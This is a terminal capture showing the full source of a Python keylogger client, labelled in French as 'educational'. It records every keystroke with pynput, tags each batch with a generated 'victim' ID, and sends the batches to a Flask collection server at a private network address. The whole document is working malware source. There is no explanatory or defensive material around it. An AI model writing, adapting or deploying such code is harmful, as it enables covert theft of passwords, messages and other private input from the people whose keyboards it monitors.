(env) root@ubu:/home/ubu/Documents/keylogger_v2# cat v2_keylogger.py
#!/usr/bin/env python3
"""
Keylogger pédagogique - CLIENT
Capture les vraies frappes clavier et les envoie au serveur Flask
"""

import requests
import time
import json
import uuid
from datetime import datetime
from pynput import keyboard
from threading import Thread
from queue import Queue

SERVER_URL = "http://192.168.30.131:5000/api/logs"
BATCH_SIZE = 10

# ID unique de la victime
VICTIM_ID = f"victime_{uuid.uuid4()}"

log_queue = Queue()

def on_press(key):
    """Capture chaque touche pressée"""
    try:
        k = key.char
        t = "char"
    except AttributeError:
        k = str(key).replace("Key.", "")
        t = "special"

    entry = {
        "timestamp": datetime.now().isoformat(),
        "key": k,
        "type": t
    }

    log_queue.put(entry)
    print(f"[CAPTURE] {k}")

def sender():
    """Envoie par batch les touches capturées"""
    while True:
        batch = []

        while len(batch) < BATCH_SIZE and not log_queue.empty():
            batch.append(log_queue.get())

        if batch:
            data = {
                "victim_id": VICTIM_ID,
                "keys": batch
            }

            try:
                r = requests.post(SERVER_URL, json=data, timeout=3)
                print("[+] Serveur répond :", r.json())
            except Exception as e:
                print("[!] Impossible d'envoyer :", e)

        time.sleep(1)

def main():
    print("[*] Keylogger pédagogique démarré…")
    print("[*] Victime ID :", VICTIM_ID)
    print("[*] Envoi vers :", SERVER_URL)

    # Thread d'envoi
    Thread(target=sender, daemon=True).start()

    # Capture clavier
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
